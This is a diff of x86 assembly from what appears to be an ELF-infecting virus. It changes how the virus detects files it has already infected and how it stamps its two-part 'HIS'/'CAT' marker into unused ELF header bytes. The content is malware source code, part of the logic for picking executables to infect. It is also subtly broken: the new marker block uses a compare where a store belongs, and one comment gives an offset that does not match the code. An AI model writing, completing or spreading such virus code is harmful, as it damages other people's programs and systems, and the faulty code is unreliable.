@@ -121,12 +121,12 @@ check_elf:
     jnz close_file              ; not an ELF
 
     ; check whether it has been infected
-    mov ecx, 0x00544143             ; "CAT "in little-endian, first of the infected marker
-    cmp dword [edi+2080+8], ecx     ; marker should show up after the elf header offset 0x08, e_ident[EI_ABIVERSION] and e_ident[EI_PAD], which is unused
+    mov ecx, 0x00534948             ; "HIS "in little-endian, first part of the infected marker  
+    cmp dword [edi+2080+8], ecx     ; first part of the marker should show up after the elf header offset 0x08, e_ident[EI_ABIVERSION] and e_ident[EI_PAD], which is unused
+    jz close_file                   ; signature exists.  Already infected.  Close file.
 
-    mov ecx, 0x00544143             ; "HIS "in little-endian, second part of the infected marker
-    cmp dword [edi+2080+12], ecx     ; marker should show up after the elf header offset 
-
+    mov ecx, 0x00544143             ; "CAT "in little-endian, second part of the infected marker
+    cmp dword [edi+2080+12], ecx    ; second part of the marker should show up after the elf header offset 0x12, which is unused
     jz close_file                   ; signature exists.  Already infected.  Close file.
 
 save_target:
@@ -192,8 +192,11 @@ eof:
 
 ; insert infected marker
 marker:
-    mov ecx, 0x00544143                 ; "CAT "in little-endian, first of the infected marker
-    mov [edi+2080+8], ecx
+    mov ecx, 0x00534948             ; "HIS "in little-endian, first part of the infected marker  
+    mov dword [edi+2080+8], ecx
+
+    mov ecx, 0x00544143             ; "CAT "in little-endian, second part of the infected marker
+    cmp dword [edi+2080+12], ecx
 
 ; initialize for program_header_loop
     xor ecx, ecx
